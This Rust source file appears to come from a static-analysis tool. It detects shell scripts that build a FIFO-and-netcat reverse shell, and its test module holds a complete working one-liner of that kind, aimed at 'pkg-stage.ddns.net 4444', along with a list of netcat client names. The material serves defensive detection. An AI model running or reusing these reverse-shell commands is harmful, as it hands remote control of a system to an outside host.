//! Bounded literal FIFO feedback recipes. These are source relationships,
//! not observed execution, successful FIFO creation or a reachable caller.
use super::{TreeCache, named_children};
use crate::{FileType, Values, value_key};
use serde_json::{Value, json};
use tree_sitter::Node;

const MAX_SOURCE_BYTES: usize = 8192;
const MAX_BODY_BYTES: usize = 4096;

fn text<'s>(node: Node<'_>, source: &'s str) -> &'s str {
    node.utf8_text(source.as_bytes()).unwrap_or("")
}

fn children(node: Node<'_>) -> Vec<Node<'_>> {
    named_children(node).filter(|n| !n.is_extra()).collect()
}

fn word<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
    matches!(node.kind(), "word" | "number")
        .then(|| text(node, source))
        .filter(|s| !s.is_empty() && !s.contains(['$', '`', '\\']))
}

fn command<'t, 's>(node: Node<'t>, source: &'s str) -> Option<(&'s str, Vec<Node<'t>>)> {
    if node.kind() != "command" {
        return None;
    }
    let name = node.child_by_field_name("name")?;
    let name_children = children(name);
    let [token] = name_children.as_slice() else {
        return None;
    };
    let name = word(*token, source)?;
    let mut args = Vec::new();
    for child in children(node) {
        if child != node.child_by_field_name("name")? {
            // Assignment prefixes, substitutions and redirects are not argv.
            if !matches!(child.kind(), "word" | "number" | "raw_string" | "string") {
                return None;
            }
            args.push(child);
        }
    }
    Some((name, args))
}

fn shell(name: &str) -> bool {
    ["sh", "bash", "dash"].into_iter().any(|base| {
        name == base || name == format!("/bin/{base}") || name == format!("/usr/bin/{base}")
    })
}

/// Return the requested stream's sole literal path. Other redirects may only
/// discard stderr; a second redirect or changed descriptor invalidates binding.
fn redirected<'t, 's>(
    node: Node<'t>,
    source: &'s str,
    stream: u8,
) -> Option<(Node<'t>, &'s str, Option<Node<'t>>)> {
    if node.kind() != "redirected_statement" {
        return None;
    }
    let body = node.child_by_field_name("body")?;
    let mut path = None;
    let mut inline_descriptor = None;
    for redirect in children(node).into_iter().filter(|n| *n != body) {
        if redirect.kind() != "file_redirect" {
            return None;
        }
        let descriptor = redirect.child_by_field_name("descriptor");
        let destination = word(redirect.child_by_field_name("destination")?, source)?;
        let operator = (0..redirect.child_count())
            .filter_map(|i| redirect.child(i))
            .find(|n| !n.is_named())?;
        let operator = text(operator, source);
        let default = if operator == "<" { 0 } else { 1 };
        // The Bash grammar can attach an adjacent input descriptor to the
        // command as a numeric argument (sh 0<path). Whitespace separates a
        // real argv value (sh 0 <path), which must remain an argument.
        let adjacent = if descriptor.is_none() && operator == "<" && body.kind() == "command" {
            children(body)
                .last()
                .copied()
                .filter(|arg| arg.kind() == "number" && arg.end_byte() == redirect.start_byte())
        } else {
            None
        };
        let descriptor = descriptor
            .or(adjacent)
            .map_or(Some(default), |n| text(n, source).parse::<u8>().ok())?;
        if descriptor == stream
            && ((stream == 0 && operator == "<") || (stream == 1 && operator == ">"))
        {
            if path.replace(destination).is_some() {
                return None;
            }
            inline_descriptor = adjacent;
        } else if !(descriptor == 2 && operator == ">" && destination == "/dev/null") {
            return None;
        }
    }
    Some((body, path?, inline_descriptor))
}

fn discard_stderr<'t>(node: Node<'t>, source: &str) -> Option<Node<'t>> {
    if node.kind() != "redirected_statement" {
        return Some(node);
    }
    let body = node.child_by_field_name("body")?;
    let redirects: Vec<_> = children(node).into_iter().filter(|n| *n != body).collect();
    let [redirect] = redirects.as_slice() else {
        return None;
    };
    if text(*redirect, source)
        .split_whitespace()
        .collect::<String>()
        != "2>/dev/null"
    {
        return None;
    }
    Some(body)
}

fn literal_body<'s>(node: Node<'_>, source: &'s str) -> Option<&'s str> {
    let raw = text(node, source);
    let body = match node.kind() {
        "raw_string" => raw.strip_prefix('\'')?.strip_suffix('\'')?,
        "string" => raw.strip_prefix('"')?.strip_suffix('"')?,
        _ => return None,
    };
    // Bare command words and two redirections only. This excludes expansion,
    // quoting, compound commands and nested parser/scanner ambiguity before
    // the shared bounded parser sees the body.
    (body.len() <= MAX_BODY_BYTES
        && body
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"/_-.:<>| \t\r\n".contains(&b)))
    .then_some(body)
}

fn feedback(body: &str, fifo: &str) -> Option<(String, String, String, u16)> {
    if ![b'|', b'<', b'>']
        .into_iter()
        .all(|b| body.as_bytes().contains(&b))
    {
        return None;
    }
    let parsed = TreeCache::parse(body.as_bytes(), FileType::Shell, None);
    let cache = parsed.cache()?;
    let root = cache.tree().root_node();
    if root.has_error() {
        return None;
    }
    let nodes = children(root);
    let [output] = nodes.as_slice() else {
        return None;
    };
    let (pipeline, output_path, _) = redirected(*output, body, 1)?;
    if output_path != fifo || pipeline.kind() != "pipeline" {
        return None;
    }
    let stages = children(pipeline);
    let [left, right] = stages.as_slice() else {
        return None;
    };
    let operators: Vec<_> = (0..pipeline.child_count())
        .filter_map(|i| pipeline.child(i))
        .filter(|n| !n.is_named())
        .map(|n| text(n, body))
        .collect();
    if operators != ["|"] {
        return None;
    }
    let (input, input_path, descriptor_arg) = redirected(*left, body, 0)?;
    let (interpreter, mut args) = command(input, body)?;
    if let Some(arg) = descriptor_arg {
        args.retain(|n| *n != arg);
    }
    if input_path != fifo || !shell(interpreter) || !args.is_empty() {
        return None;
    }
    let (network, args) = command(*right, body)?;
    if ![
        "nc",
        "netcat",
        "ncat",
        "/bin/nc",
        "/usr/bin/nc",
        "/usr/bin/netcat",
        "/usr/bin/ncat",
    ]
    .contains(&network)
    {
        return None;
    }
    let [host, port] = args.as_slice() else {
        return None;
    };
    let host = word(*host, body)?;
    let dns_name = host.len() <= 253
        && host.split('.').all(|label| {
            !label.is_empty()
                && label.len() <= 63
                && label
                    .as_bytes()
                    .first()
                    .is_some_and(u8::is_ascii_alphanumeric)
                && label
                    .as_bytes()
                    .last()
                    .is_some_and(u8::is_ascii_alphanumeric)
                && label
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        });
    if host.parse::<std::net::IpAddr>().is_err() && !dns_name {
        return None;
    }
    let port = word(*port, body)?.parse::<u16>().ok().filter(|p| *p != 0)?;
    Some((interpreter.into(), network.into(), host.into(), port))
}

pub(super) fn emit(root: Node<'_>, source: &str, values: &mut Values) {
    if source.len() > MAX_SOURCE_BYTES || root.has_error() {
        return;
    }
    let nodes = children(root);
    if !(2..=4).contains(&nodes.len()) {
        return;
    }
    let [creation_node, invocation, trailing @ ..] = nodes.as_slice() else {
        return;
    };
    let Some((creation, args)) = command(*creation_node, source) else {
        return;
    };
    if !["mkfifo", "/usr/bin/mkfifo", "/bin/mkfifo"].contains(&creation) {
        return;
    }
    let [fifo_arg] = args.as_slice() else {
        return;
    };
    let Some(fifo) = word(*fifo_arg, source).filter(|s| s.starts_with('/')) else {
        return;
    };
    let Some(invocation) = discard_stderr(*invocation, source) else {
        return;
    };
    let Some((caller, args)) = command(invocation, source) else {
        return;
    };
    let [option, payload] = args.as_slice() else {
        return;
    };
    if !shell(caller) || !matches!(word(*option, source), Some("-c" | "-lc")) {
        return;
    }
    // Only optional disown and removal of that same FIFO may follow. There
    // are no aliases, function definitions, PATH writes or unknown callbacks
    // in this closed recipe.
    for node in trailing {
        let Some(node) = discard_stderr(*node, source) else {
            return;
        };
        let Some((name, args)) = command(node, source) else {
            return;
        };
        if name == "disown" && args.is_empty() {
            continue;
        }
        let [option, path] = args.as_slice() else {
            return;
        };
        if !["rm", "/bin/rm", "/usr/bin/rm"].contains(&name)
            || word(*option, source) != Some("-f")
            || word(*path, source) != Some(fifo)
        {
            return;
        }
    }
    let Some(body) = literal_body(*payload, source) else {
        return;
    };
    let Some((interpreter, network, host, port)) = feedback(body, fifo) else {
        return;
    };
    values.insert_key(
        value_key!("source.shell.fifo_network_loops"),
        Value::Array(vec![json!({
            "mechanism": "fifo-shell-netcat-feedback", "fifo": fifo,
            "interpreter": interpreter, "network_client": network, "host": host, "port": port,
            "creation_offset": creation_node.start_byte(), "command_offset": invocation.start_byte(),
            "payload_offset": payload.start_byte() + 1
        })]),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    const SOURCE: &str = "mkfifo /tmp/.x11r; sh -c 'sh </tmp/.x11r | nc pkg-stage.ddns.net 4444 >/tmp/.x11r' 2>/dev/null & disown; rm -f /tmp/.x11r 2>/dev/null\n";
    fn facts(source: &str) -> Value {
        let parsed = crate::OpenOptions::new()
            .path(std::path::Path::new("fixture.sh"))
            .open(source.as_bytes());
        parsed
            .values()
            .get("source.shell.fifo_network_loops")
            .cloned()
            .unwrap_or(Value::Null)
    }
    #[test]
    fn binds_declared_fifo_both_streams_and_literal_command_argument() {
        let rows = facts(SOURCE);
        assert_eq!(rows[0]["fifo"], "/tmp/.x11r");
        assert_eq!(rows[0]["host"], "pkg-stage.ddns.net");
        assert_eq!(rows[0]["port"], 4444);
        assert_eq!(rows[0]["payload_offset"], 26);
        let renamed = SOURCE
            .replace("/tmp/.x11r", "/var/tmp/other-pipe")
            .replace("pkg-stage.ddns.net", "192.0.2.9")
            .replace("4444", "2345");
        assert_eq!(facts(&renamed)[0]["port"], 2345);
        let absolute = SOURCE
            .replace("sh -c", "/bin/bash -c")
            .replace("sh <", "/bin/bash <")
            .replace("nc pkg-stage", "/usr/bin/nc pkg-stage");
        assert_eq!(facts(&absolute)[0]["network_client"], "/usr/bin/nc");
        let minimal = "mkfifo /tmp/f; sh -c \"sh </tmp/f | nc 192.0.2.1 8080 >/tmp/f\"";
        assert_eq!(facts(minimal)[0]["fifo"], "/tmp/f");
        let explicit = SOURCE.replace("sh <", "sh 0<").replace("4444 >", "4444 1>");
        assert_eq!(facts(&explicit)[0]["fifo"], "/tmp/.x11r");
    }
    #[test]
    fn rejects_broken_paths_directions_non_shells_and_unrelated_commands() {
        let variants = [
            SOURCE.replacen("mkfifo /tmp/.x11r", "mkfifo /tmp/other", 1),
            SOURCE.replace("sh </tmp/.x11r", "sh </tmp/other"),
            SOURCE.replace(">/tmp/.x11r", ">/tmp/other"),
            SOURCE.replace("sh </tmp/.x11r", "cat </tmp/.x11r"),
            SOURCE.replace("sh </tmp/.x11r", "sh 1</tmp/.x11r"),
            SOURCE.replace("sh </tmp/.x11r", "sh 0 </tmp/.x11r"),
            SOURCE.replace(">/tmp/.x11r", "2>/tmp/.x11r"),
            SOURCE.replace("sh -c", "echo -c"),
            SOURCE.replace("4444", "0"),
            SOURCE.replace("4444", "65536"),
            SOURCE.replace("pkg-stage.ddns.net", "http://example.test"),
            SOURCE.replace("pkg-stage.ddns.net", "bad-.example.test"),
            format!("sh() {{ printf '%s' \"$*\"; }}\n{SOURCE}"),
            SOURCE.replace("& disown", "& override; disown"),
            SOURCE.replace("sh </tmp/.x11r", "sh -c ignored </tmp/.x11r"),
            SOURCE.replace("nc pkg-stage", "echo pkg-stage"),
        ];
        for variant in variants {
            assert_eq!(facts(&variant), Value::Null, "{variant}");
        }
    }
    #[test]
    fn data_comments_and_dynamic_payloads_do_not_supply_flow() {
        for source in [
            format!("# {SOURCE}"),
            format!("printf '%s' {SOURCE:?}"),
            SOURCE.replace("pkg-stage.ddns.net", "${{HOST}}"),
            SOURCE.replace("sh </tmp/.x11r", "sh </tmp/$(choose)"),
        ] {
            assert_eq!(facts(&source), Value::Null, "{source}");
        }
    }
}
